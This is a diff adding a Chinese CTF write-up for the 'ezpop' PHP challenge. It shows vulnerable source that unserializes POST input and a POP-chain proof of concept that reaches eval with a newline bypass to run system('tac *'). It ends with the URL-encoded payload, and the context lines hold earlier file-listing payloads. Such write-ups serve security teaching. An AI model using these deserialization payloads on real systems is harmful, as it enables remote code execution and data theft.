@@ -437,3 +437,133 @@ a=DirectoryIterator&b=glob://./flag?*.php&c=9223372036854775806
 a=SplFileObject&b=flag56ea8b83122449e814e0fd7bfb5f220a.php&c=9223372036854775806
 ```
 
+
+
+
+
+## 2022DASCTF X SU 三月春季挑战赛
+
+### ezpop
+
+```php
+<?php
+
+class crow
+{
+    public $v1;
+    public $v2;
+
+    function eval() {
+        echo new $this->v1($this->v2);
+    }
+
+    public function __invoke()
+    {
+        $this->v1->world();
+    }
+}
+
+class fin
+{
+    public $f1;
+
+    public function __destruct()
+    {
+        echo $this->f1 . '114514';
+    }
+
+    public function run()
+    {
+        ($this->f1)();
+    }
+
+    public function __call($a, $b)
+    {
+        echo $this->f1->get_flag();
+    }
+
+}
+
+class what
+{
+    public $a;
+
+    public function __toString()
+    {
+        $this->a->run();
+        return 'hello';
+    }
+}
+class mix
+{
+    public $m1;
+
+    public function run()
+    {
+        ($this->m1)();
+    }
+
+    public function get_flag()
+    {
+        eval('#' . $this->m1);
+    }
+
+}
+
+if (isset($_POST['cmd'])) {
+    unserialize($_POST['cmd']);
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+简单的pop链
+`eval('#' . $this->m1);`换行绕过即可
+
+poc如下：
+
+```php
+<?php
+class crow
+{
+    public $v1;
+    public $v2;
+}
+
+class fin
+{
+    public $f1;
+}
+
+class what
+{
+    public $a;
+}
+class mix
+{
+    public $m1;
+}
+
+//fin __destruct() -> what __toString() -> mix run() -> crow __invoke
+
+$a = new fin();
+$a->f1=new what();
+$a->f1->a=new mix();
+$a->f1->a->m1=new crow();
+$a->f1->a->m1->v1=new fin();
+$a->f1->a->m1->v1->f1=new mix();
+$a->f1->a->m1->v1->f1->m1="
+system('tac *');";
+echo urlencode(serialize($a));
+```
+
+这里flag在当前目录下，有好几个文件，直接读完就行
+
+payload：
+
+```
+O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A18%3A%22%0D%0Asystem%28%27tac+%2A%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D
+```
+
+![](https://s2.loli.net/2022/03/26/lQU6GCyXRY9DbiB.png)
+
